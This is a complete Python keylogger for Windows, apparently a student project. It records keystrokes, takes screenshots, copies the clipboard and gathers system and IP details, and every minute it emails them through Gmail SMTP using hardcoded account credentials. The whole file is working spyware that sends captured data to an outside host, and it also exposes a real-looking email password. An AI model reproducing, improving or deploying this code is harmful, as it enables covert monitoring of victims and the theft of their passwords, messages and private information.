#Update the username and password as well. After compeletion make a git hub id and upload there along with the ppt and the synopsis.
# Libraries used

# For email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Timer
import time

# For Computer Information
import socket
import platform

# For Clipboard Information
import win32clipboard

# For Key Log
from pynput.keyboard import Key, Listener
from requests import get
import ctypes

# For Screenshot pillow
from PIL import ImageGrab

# Default values
fromaddr = "andypoiuytr@gmail.com"
password = "mspe tbdo eook bjyy"
toaddr = "andypoiuytr@gmail.com"

# Email Controls
def send_email(filename, attachment, toaddr):
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Keylogger Working..."
    msg.attach(MIMEText(body, 'plain'))

    # Attach log file
    log_attachment = open(filename, 'rb')
    log_part = MIMEBase('application', 'octet-stream')
    log_part.set_payload(log_attachment.read())
    encoders.encode_base64(log_part)
    log_part.add_header('Content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(log_part)

    # Attach system information file
    sys_attachment = open("system_info.txt", 'rb')
    sys_part = MIMEBase('application', 'octet-stream')
    sys_part.set_payload(sys_attachment.read())
    encoders.encode_base64(sys_part)
    sys_part.add_header('Content-Disposition', "attachment; filename=system_info.txt")
    msg.attach(sys_part)

    # Attach the screenshot file
    screenshot_attachment = open("screenshot.png", "rb")
    screenshot_part = MIMEBase("application", "octet-stream")
    screenshot_part.set_payload(screenshot_attachment.read())
    encoders.encode_base64(screenshot_part)
    screenshot_part.add_header("Content-Disposition", "attachment; filename=screenshot.png")
    msg.attach(screenshot_part)

    # Attach the clipboard file
    clipboard_attachment = open("clipboard.txt", "rb")
    clipboard_part = MIMEBase("application", "octet-stream")
    clipboard_part.set_payload(clipboard_attachment.read())
    encoders.encode_base64(clipboard_part)
    clipboard_part.add_header("Content-Disposition", "attachment; filename=clipboard.txt")
    msg.attach(clipboard_part)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Computer Information
def computer_info():
    with open("system_info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip +'\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)" +'\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() +'\n')
        f.write("Hostname: " +hostname + '\n')
        f.write("Private IP Address: " +IPAddr +'\n')

computer_info()


# Clipboard Information
def copy_clipboard():
    with open("clipboard.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied ")

# Screenshot Information
def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

# Key log Information
capslock_pressed = False
shift_pressed = False

def get_capslock_state():
    # Retrieve the current state of the Caps Lock key
    return ctypes.windll.user32.GetKeyState(0x14) & 0xFFFF != 0

keys = []
count = 0
def on_press(key):
    global keys, count, shift_pressed, capslock_pressed

    print(key)
    keys.append(key)
    count +=1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

    if key == Key.shift:
        shift_pressed = True

    if key == Key.caps_lock:
        capslock_pressed = get_capslock_state()

def write_file(keys):
    with open("log_txt" , "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find ("space") >0:
                f.write(' ')
            elif k.find("enter") >0:
                f.write('\n')
            elif k.find("Key") == -1:
                if capslock_pressed and not shift_pressed:
                    f.write(k.upper())
                elif not capslock_pressed and shift_pressed:
                    f.write(k.upper())
                elif capslock_pressed and shift_pressed:
                    f.write(k.lower())
                else:
                    f.write(k)

def on_release(key):
    global shift_pressed, capslock_pressed
    if key == Key.esc:
        return False

    if key == Key.shift:
        shift_pressed = False

    if key == Key.caps_lock:
        capslock_pressed = get_capslock_state()


wait_time= 60
start_time= time.time()

with Listener (on_press=on_press, on_release=on_release) as listener:
    print("hi")
    #Timer
    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time

        if elapsed_time >= wait_time:
            screenshot()
            copy_clipboard()
            send_email('log_txt', "log_txt", toaddr)

            start_time = current_time

        time.sleep(0.5)
    listener.join()

